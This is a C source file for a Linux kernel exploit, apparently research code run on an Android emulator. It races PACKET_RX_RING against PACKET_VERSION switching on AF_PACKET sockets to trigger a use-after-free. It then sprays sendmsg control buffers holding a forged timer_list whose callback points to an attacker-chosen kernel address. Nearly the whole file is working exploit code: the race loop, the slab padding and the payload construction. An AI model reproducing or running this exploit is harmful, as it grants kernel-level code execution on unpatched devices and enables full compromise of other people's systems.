//The goal here is to create af packets.
//This should create struct packet_socket obkects allocated by the SLUB allocator.
//I will then dump the memory on the emulator using lime and try to find these sockets.
//I can then compare the size with that of what I determined from my kernel module to print the sizes and output.
//(y)
#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/wait.h>
#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <linux/if_packet.h>
#include <pthread.h>
#include <linux/sched.h>
#include <netinet/tcp.h>
#include <sys/syscall.h>
#include <signal.h>
#include <sched.h>
#include <sys/utsname.h>
#include <pthread.h>
#include "deviceconfig.h"
#include "race.h"

int allfds[SPRAY_THREAD_COUNT];
int padfds[SK_PAD];

volatile int barrier = 1;
volatile int vers_switcher_done = 0;
volatile void* physfunc;


struct tpacket_req3 tp;
volatile int sfd;

void pad_kmalloc(void) {
    int x;
    for(x=0; x<SK_PAD; x++) {
        padfds[x] = socket(AF_PACKET,SOCK_DGRAM,htons(ETH_P_ARP));
        if(padfds[x] == -1) {
            fprintf(stderr,"pad_kmalloc() socket error\n");
            exit(1);
        }
    }
}

void* lock_ctlbuf(void* threadid) {
    long tid = (long)threadid;
    char buf2[100];
    int rc,i;
    struct sockaddr_in server;
    char message[1000] , server_reply[2000];
    union {
        char   control[CMSG_SPACE(BUFLEN)];
        struct cmsghdr cmh;
        struct {
            char padding[TIMER_OFFSET];
            struct timer_list timer;
        };
        /* Space large enough to hold a ucred structure */
    } control_un;
    struct cmsghdr *cmhp;
    struct msghdr msgh;
    struct iovec iov;
    char data[DATALEN];
    unsigned long l = 0;
    char* b = (char*)&l;
    b[0] = '\x25';
    b[1] = '\x64';
    b[2] = '\x0a';
    b[3] = '\x00';


    server.sin_addr.s_addr = inet_addr("127.0.0.1");
    server.sin_family = AF_INET;
    server.sin_port = htons( 5000 );
 
    //Connect to remote server
    if (connect(allfds[tid] , (struct sockaddr *)&server , sizeof(server)) < 0)
    {
        perror("connect failed. Error");
    }
     
    //printf("Send Msg Test\n");
    memset(&control_un, 0x00, sizeof(control_un));
    memset(&control_un, 0x42, sizeof(control_un));
    control_un.cmh.cmsg_len = CMSG_LEN(BUFLEN);
    control_un.cmh.cmsg_level = SOL_SOCKET;
    control_un.cmh.cmsg_type = SCM_RIGHTS;
    control_un.timer.next = (int)(((unsigned long)physfunc)+2048); //KSYM_BOOT_TVEC_BASE;
    control_un.timer.prev = (int)(((unsigned long)physfunc)+2048); //KSYM_BOOT_TVEC_BASE; 
    control_un.timer.expires = 2u; //force an expiry? 4294943360u; //4294967295u;
    control_un.timer.base = 0xc04fb100; //0; //0xc04fd100; // 0; KSYM_BOOT_TVEC_BASE;
    control_un.timer.function = (void*)physfunc; //(void*)0xc025ddf0;//physfunc;
    control_un.timer.data = (unsigned long)physfunc; //1;//(unsigned long)physfunc;//p.p;
    //control_un.timer.flags = 1;
    control_un.timer.slack = -1; // important?
    printf("> %lx\n",(unsigned long)physfunc);
    fflush(stdout);


    //memset(&control_un, 'A', sizeof(control_un));
    //control_un.cmh.cmsg_len = CMSG_LEN(BUFLEN);
    //control_un.cmh.cmsg_level = SOL_SOCKET;
    //control_un.cmh.cmsg_type = SCM_RIGHTS;

    msgh.msg_name = NULL;
    msgh.msg_namelen = 0;

    msgh.msg_control = control_un.control;
    msgh.msg_controllen = sizeof(control_un.control);

    msgh.msg_iov = &iov;
    msgh.msg_iovlen = 1;
    iov.iov_base = &data;
    iov.iov_len = sizeof(data);
    memset(&data, 0x41, sizeof(data));

    ////printf("Res: %d %s", res, strerror(errno));
    for ( i = 0; i < 600; ++i) {

        int res = sendmsg(allfds[tid], &msgh,0);
        if( res < 0)  {
                perror("sendmsg");
        }
        //printf("Sent Message %d\n",i);
    }
    pthread_exit(NULL);
}


// Attack Part I 
// Call PACKET_RX_RING option once to set a timer.
void *setsockopt_thread(void *arg)
{
    while(barrier) {
    }
    setsockopt(sfd, SOL_PACKET, PACKET_RX_RING, (void*) &tp, sizeof(tp));

    return NULL;
}

// Attack Part II
// Race Part I and try to flip the Version from 1 to 3 
void *vers_switcher(void *arg)
{
    int val,x,y;

    while(barrier) {}

    while(1) {
        val = TPACKET_V1;
        x = setsockopt(sfd, SOL_PACKET, PACKET_VERSION, &val, sizeof(val));

        y++;

        if(x != 0) break;

        val = TPACKET_V3;
        x = setsockopt(sfd, SOL_PACKET, PACKET_VERSION, &val, sizeof(val));

        if(x != 0) break;

        y++;
    }
    if (x < 0) {
        printf("VERS SWITCHER FAILED!?!? %d \n \t %s \n",sfd,strerror(errno));
        fflush(stdout);
        
        //vers_switcher_done = 1;
        //return NULL;
    }

    fprintf(stderr,"version switcher stopping, x = %d (y = %d, last val = %d)\n",x,y,val);
    vers_switcher_done = 1;


    return NULL;
}


PhyPointer race(PhyPointer p) {
    printf("asdfasdf");
    fflush(stdout);
    int x = 0;
    int k = 0;
    int fd;
    int val;
    int off;
    physfunc = p.p; //note: this is the KVA not physical !@!@#!@#
    for (k = 0; k < SPRAY_THREAD_COUNT; ++k) {
        fd = socket(AF_INET , SOCK_STREAM , 0);
        if (fd == -1)
        {
            printf("Could not create socket");
            fflush(stdout);
        }
        //puts("Socket created");
        int sendbuff = 2;
        if (setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sendbuff, sizeof(sendbuff)) < 0) {
            perror("Setting sock buff size");
        }
        allfds[k] = fd;
    }

    pthread_t setsockopt_thread_thread,a;
    struct tpacket_block_desc *pbd;
    socklen_t l;

    printf("asdfasdf");
    fflush(stdout);

    pad_kmalloc();

    fd=socket(AF_PACKET,SOCK_DGRAM,htons(ETH_P_ARP));

    if (fd==-1) {
        perror("target socket error\n");
        exit(1);
    }
    // want to create 
    struct stat tgtStat;
    if (fstat(fd,&tgtStat) < 0) {
        perror("fstat");
    } else {
        printf("target socket inode: %d\n", (unsigned int)tgtStat.st_ino);
        fflush(stdout);
    }

    fprintf(stderr,"sockets allocated\n");

    printf("Start Attack..\n");
    fflush(stdout);

    val = TPACKET_V3;

    tp.tp_block_size = CONF_RING_FRAMES * getpagesize();
    tp.tp_block_nr = 1;
    tp.tp_frame_size = getpagesize();
    tp.tp_frame_nr = CONF_RING_FRAMES;

//try to set the timeout to 10 seconds
//the default timeout might still be used though depending on when the race was won
    //want to have the timeout as 200 jiffies
    //CONFIG_HZ = 100; implies 1 jiffy = 10ms
    //Soo... 200 jiffy = 200*10ms = 2 seconds 
    tp.tp_retire_blk_tov = 2000; // 10000; == 200 jiffies == 1st bucket has 256
    while(1) {
        fd=socket(AF_PACKET,SOCK_DGRAM,htons(ETH_P_ARP));

        if (fd==-1) {
            perror("target socket error\n");
            exit(1);
        }

        int res = setsockopt(fd, SOL_PACKET, PACKET_VERSION, &val, sizeof(val));
        if  (res < 0) {
            printf("%s\n",strerror(errno));
            fflush(stdout);
            p.p = (void*)1234;
            return p;
        }

        sfd = fd;

        barrier = 1;
        vers_switcher_done = 0;

        if(pthread_create(&setsockopt_thread_thread, NULL, setsockopt_thread, (void *)NULL)) {
            fprintf(stderr, "Error creating thread\n");
            p.p = (void*)1234;
            return p;
        }


        pthread_create(&a, NULL, vers_switcher, (void *)NULL);

        usleep(200000);

        fprintf(stderr,"removing barrier and !spraying..\n");

        barrier = 0;
        //start threads and alloc ctl buf's in slabs
        usleep(100000);

        while(!vers_switcher_done)usleep(100000);

        l = sizeof(val);
        getsockopt(sfd, SOL_PACKET, PACKET_VERSION, &val, &l);

        fprintf(stderr,"current packet version = %d\n",val);

        pbd = mmap(0, tp.tp_block_size * tp.tp_block_nr, PROT_READ | PROT_WRITE, MAP_SHARED, sfd, 0);


        if(pbd == MAP_FAILED) {
            fprintf(stderr,"could not map pbd\n");
            exit(1);
        }

        else {
            off = pbd->hdr.bh1.offset_to_first_pkt;
            fprintf(stderr,"pbd->hdr.bh1.offset_to_first_pkt = %d\n",off);
        }

        //munmap for free to work :S
        munmap(pbd, tp.tp_block_size * tp.tp_block_nr);

        // did we win?
        if(val == TPACKET_V1 && off != 0) {
            fprintf(stderr,"*=*=*=* TPACKET_V1 && offset_to_first_pkt != 0, race won *=*=*=*\n");
            break; //yeh we did bro
        } else {
            fprintf(stderr, "you suck");
        }
        close(sfd);
        //sleep(12); // fuck you and your sleep
    }
    pad_kmalloc(); //pad against 
    int res2 = close(sfd); // close attack socket, and now try to spray into that location
    if (res2 < 0) {
        printf("URGGGGGGGGGGGGGGGG %s %d\n",strerror(errno),res2);
        fflush(stdout);
        p.p = (void*)1234;
        return p;
    } else {
        printf("closed sfd\n");
        fflush(stdout);
    }

    pthread_t dummy;
    long rc,t;
    for (t = 0; t < SPRAY_THREAD_COUNT; t++) {
        rc = pthread_create(&dummy, NULL, lock_ctlbuf, (void*)t);
        if (rc) {
            perror("pthread_create()");
            exit(1);
        }
    }

    
    k = 0;
    //for (k=0; k<40; ++k) {
    //    printf("> %d\n",k);
    //    sleep(1);
    //}
    getc(stdin);

    //cleanup
    //for(x=0; x<SK_PAD; x++) {
    //    close(padfds[x]);
    //}
    //for(x=0; x<SPRAY_THREAD_COUNT; x++) {
    //    close(allfds[x]);
    //}

    return p;
}
